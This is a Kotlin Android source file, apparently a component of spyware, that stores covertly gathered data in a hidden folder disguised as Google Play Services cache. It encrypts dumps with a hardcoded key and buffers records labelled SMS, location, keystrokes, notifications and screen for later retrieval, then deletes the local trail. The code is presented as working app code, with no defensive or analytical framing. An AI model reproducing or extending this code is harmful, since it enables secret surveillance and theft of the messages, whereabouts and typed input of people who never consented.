package com.example.myandroid

import android.content.Context
import android.os.Environment
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject
import org.json.JSONArray

object DumpManager {

    // Hidden path, 6 folders deep, masquerading as System Cache
    private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
    private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128

    fun createDailyDump(ctx: Context) {
        try {
            val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
            val dayDir = File(ROOT_DIR, dateStr)
            if (!dayDir.exists()) dayDir.mkdirs()

            val timestamp = SimpleDateFormat("HH_mm_ss", Locale.US).format(Date())
            
            // 1. Readable Log
            val logFile = File(dayDir, "sys_log_$timestamp.txt")
            val report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS ---\n" + DebugLogger.getLogs()
            logFile.writeText(report)

            // 2. Encrypted Data Blob (.ctx extension)
            val jsonFile = File(dayDir, "data_snapshot_$timestamp.ctx")
            val rawJson = CloudManager.collectDumpData(ctx).toString()
            val encrypted = encrypt(rawJson)
            jsonFile.writeBytes(encrypted)

            DebugLogger.log("DUMP", "Saved to ${dayDir.absolutePath}")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getDumpsForToday(): List<File> {
        val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
        val dayDir = File(ROOT_DIR, dateStr)
        return if (dayDir.exists()) dayDir.listFiles()?.toList() ?: emptyList() else emptyList()
    }

    private fun encrypt(data: String): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        val secretKey = SecretKeySpec(KEY, "AES")
        cipher.init(Cipher.ENCRYPT_MODE, secretKey)
        return cipher.doFinal(data.toByteArray())
    }

    fun logVerification(category: String, pkg: String) {
        try {
            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
            File(ROOT_DIR, "sensor_verification.txt").appendText("[" + SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()) + "] [$category] $pkg ✓\n")
        } catch (e: Exception) { }
    }

    // --- STREAM LOGGING (Fixes Lag & Data Loss) ---
    fun appendLog(type: String, data: JSONObject) {
        // Run in background to prevent UI stutter
        // We use a new Thread to avoid Coroutine scope issues in simple contexts
        Thread { 
            try {
                if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
                val file = File(ROOT_DIR, "offline_buffer.jsonl")
                
                // Wrap in standardized format
                val wrapper = JSONObject()
                wrapper.put("t", type) // Type (SMS, LOC, ETC)
                wrapper.put("d", data) // The payload
                
                file.appendText(wrapper.toString() + "\n")
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    fun getAndClearLogs(): JSONObject {
        val result = JSONObject()
        // Init Buckets
        val buckets = mapOf(
            "SMS" to JSONArray(), "LOC" to JSONArray(), "KEY" to JSONArray(), 
            "NOTIF" to JSONArray(), "SCREEN" to JSONArray()
        )
        
        try {
            val file = File(ROOT_DIR, "offline_buffer.jsonl")
            if (file.exists()) {
                file.forEachLine {
                    try {
                        val obj = JSONObject(it)
                        val type = obj.optString("t")
                        val data = obj.optJSONObject("d")
                        if (buckets.containsKey(type)) {
                            buckets[type]?.put(data)
                        }
                    } catch(e: Exception){}
                }
                // Nuke file after reading to prevent duplicates
                file.delete()
            }
        } catch (e: Exception) { e.printStackTrace() }
        
        // Pack into result
        buckets.forEach { (k, v) -> result.put(k, v) }
        return result
    }
}
